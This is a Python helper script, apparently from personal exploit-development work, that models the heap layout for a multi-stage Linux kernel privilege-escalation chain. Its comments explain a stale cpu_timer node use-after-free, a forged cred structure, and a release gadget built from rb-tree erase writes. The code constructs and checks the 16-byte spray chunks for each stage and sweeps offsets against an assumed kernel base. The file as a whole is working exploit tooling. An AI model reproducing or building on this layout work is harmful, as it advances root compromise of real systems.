# mcastrel2.py -- corrected model of the mcast (psl) port of the peak chain.
#
# What changed vs. mcastrel.py Part B:
#   * Block O (the block that hosts the stale cpu_timer node X) is NOT part of
#     the uniform object pattern.  We know its fd from the leak, so it gets its
#     own 14 chunks (P_node, one per stage).  All *other* blocks share the
#     lay11 uniform pattern P_base (cred + ns/ucounts/user/gi/sec), which is
#     why we never need the fd<->block map.
#   * The fake cred no longer has to sit at X+0x10.  The stage-2 erase writes
#     pc = C, and lay11's solver already picks C (st.addr['cred']); cred+0x08
#     (gid|suid) is the one byte range the erase clobbers, which lay11 leaves
#     unconstrained.  Because C is far from X, the release path's kernel
#     writes (elist/firing/handling) never touch the cred -- unlike the AIO
#     page layout where they had to be refilled from userspace.
#   * The park is released by a *kernel* write, not by us: reaping a second
#     victim whose dead base still references X runs
#     cleanup_timerqueue() -> timerqueue_del(base, &X->node) -> rb_erase_cached
#     -> case 1b stores node->__rb_parent_color (=0) at node->rb_left
#     (= X-0x58) and __rb_change_child() with parent==0 writes
#     base->rb_node = X-0x58.  rb_next() then returns NULL (parent == 0), so
#     the cleanup loop ends.  The psl rewrite can never do this itself: the
#     lock byte's chunk is rewritten before the elist chunks, so a rewrite
#     "release" hands the kernel a half-installed node.
#
# Each (L, stage) is checked for: window fit, chunk distinctness, and that no
# transient chunk shift can make the 32-bit it_lock word read 0 while the
# collect loop is parked on it (chunks are added in index order 0..13, and
# until chunk c_lock is added the byte comes from a stale chunk).
import sys
sys.path.insert(0, r'D:\kwork\icbuild\scratch')
import lay11 as L

WLO, WHI = 0x18, 0xf8
NC = 14
CLEAN_L = (0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8)
STAGES = ('s1', 's2', 'rel')


def block_free_ivs(Lv):
    lo, hi = (Lv - 0x58) & 0xff, (Lv + 0x50) & 0xff
    iv = []
    if lo > WLO:
        iv.append((WLO, lo))
    if hi < WHI:
        iv.append((hi, WHI))
    return lo, hi, iv


def place_aux(Lv):
    """head (16B) and scratch (0x18B, only +0/+8/+0x10 used) in block O."""
    iv = block_free_ivs(Lv)[2]

    def find(size, ivs, align=8):
        for (a, b) in ivs:
            s = (a + align - 1) // align * align
            if s + size <= b:
                return s
        return None

    def cut(ivs, s, size):
        out = []
        for (a, b) in ivs:
            if a < s + size and b > s:
                if a < s:
                    out.append((a, s))
                if b > s + size:
                    out.append((s + size, b))
            else:
                out.append((a, b))
        return out

    # scratch must not straddle a chunk in a way that matters, but head must
    # not overlap scratch; try head first then scratch, and vice versa.
    for order in ((0x10, 0x18), (0x18, 0x10)):
        h = s = None
        iv2 = list(iv)
        if order[0] == 0x10:
            h = find(0x10, iv2)
            if h is None:
                continue
            iv2 = cut(iv2, h, 0x10)
            s = find(0x18, iv2)
        else:
            s = find(0x18, iv2)
            if s is None:
                continue
            iv2 = cut(iv2, s, 0x18)
            h = find(0x10, iv2)
        if h is not None and s is not None and not (h < s + 0x18 and h + 0x10 > s):
            return h, s
    return None, None


def stage_fields(base, oi, Lv, stage):
    """(offset_from_X, size, value) with value int or 'rt' (runtime)."""
    X = base + 0x100 * oi + Lv
    h, s = place_aux(Lv)
    f = []
    if stage == 's1':
        f += [(0x00, 8, s), (0x08, 8, 0), (0x10, 8, X + 0x18),
              (0x18, 8, 0), (0x20, 8, h), (0x28, 8, 0)]
        f += [(0x30, 8, 0), (0x38, 8, 0)]
        f += [(0x40, 4, 0), (0x48, 8, 0)]
        f += [(-0x24, 4, 1), (-0x58, 4, 1)]
    elif stage == 's2':
        f += [(0x00, 8, 'rt'), (0x08, 8, 0), (0x10, 8, 'rt'),
              (0x18, 8, 0), (0x20, 8, 'rt'), (0x28, 8, (1 << 64) - 1)]
        f += [(0x30, 8, 0), (0x38, 8, 0)]
        f += [(0x40, 4, 0), (0x48, 8, 'rt')]
        f += [(-0x24, 4, 1), (-0x58, 4, 1)]
    else:
        # cleanup-release gadget: pc = 0 so rb_next returns NULL; rb_left is
        # the lock word itself; the erase's case-1b store is the release.
        f += [(0x00, 8, 0), (0x08, 8, 0), (0x10, 8, X - 0x58),
              (0x18, 8, 0), (0x20, 8, 0), (0x28, 8, 0)]
        f += [(0x30, 8, 'rt'), (0x38, 8, 'rt')]
        f += [(0x40, 4, 1), (0x48, 8, 'rt')]
        f += [(-0x24, 4, 1), (-0x58, 4, 1)]
    return f, h, s


def build_chunks(base, oi, Lv, stage):
    mem = {}          # residue -> byte
    rt = []           # residues that must hold runtime values

    def put(r, v):
        r &= 0xff
        if not (WLO <= r < WHI):
            raise ValueError('residue %#x outside window' % r)
        if r in mem and mem[r] != v:
            raise ValueError('conflict at %#x' % r)
        mem[r] = v

    X = base + 0x100 * oi + Lv
    fields, h, s = stage_fields(base, oi, Lv, stage)
    for (off, size, v) in fields:
        r0 = (Lv + off) & 0xff
        if not (WLO <= r0 and r0 + size <= WHI):
            raise ValueError('field +%#x size %d outside window' % (off, size))
        if v == 'rt':
            rt.extend(range(r0, r0 + size))
            continue
        for i in range(size):
            put(r0 + i, (v >> (8 * i)) & 0xff)

    chunks = []
    for k in range(NC):
        b = bytearray(16)
        for i in range(16):
            b[i] = mem.get(WLO + 16 * k + i, 0)
        chunks.append(b)

    # distinctness: paint one free byte per duplicate chunk
    seen = set()
    for k in range(NC):
        cur = bytes(chunks[k])
        if cur in seen or cur == bytes(16):
            for i in range(16):
                r = WLO + 16 * k + i
                if r not in mem:
                    chunks[k][i] = 0x40 + k
                    break
            else:
                raise ValueError('chunk %d has no free byte' % k)
        seen.add(bytes(chunks[k]))
    if len(seen) != NC:
        raise ValueError('chunks not distinct')
    return [bytes(c) for c in chunks], mem, (h, s)


def lock_offsets(Lv):
    r0 = (Lv - 0x58) & 0xff
    return [(r0 + i, (r0 + i - WLO) // 16, (r0 + i - WLO) % 16)
            for i in range(4)]


def transient_lock_ok(chunks, Lv):
    """While the parked collect spins, the it_lock u32 must never read 0:
    every byte of the word, in every chunk, must be nonzero."""
    bad = []
    for (r, k, i) in lock_offsets(Lv):
        for c in range(NC):
            if chunks[c][i] == 0:
                bad.append((r, k, c))
    return bad


def check(base, oi, Lv, stage):
    try:
        chunks, mem, aux = build_chunks(base, oi, Lv, stage)
    except ValueError as e:
        return 'FAIL %s' % e
    bad = transient_lock_ok(chunks, Lv)
    if bad:
        return 'lock transient %s' % (bad[:3],)
    if stage == 's1' and (aux[0] is None or aux[1] is None):
        return 'no room for head/scratch'
    return None


def main():
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xffffff80036d2000
    total = fail = 0
    for Lv in CLEAN_L:
        line = []
        for stage in STAGES:
            nbad = 0
            first = None
            for oi in range(32):
                total += 1
                e = check(base, oi, Lv, stage)
                if e:
                    fail += 1
                    nbad += 1
                    if first is None:
                        first = (oi, e)
            line.append('%s:%2d/32%s' % (stage, 32 - nbad,
                                         '' if first is None else ' ' + str(first)))
        print('L=%#04x  %s' % (Lv, '  '.join(line)))
    print('total %d/%d ok' % (total - fail, total))
    return 0 if fail == 0 else 1


if __name__ == '__main__':
    raise SystemExit(main())
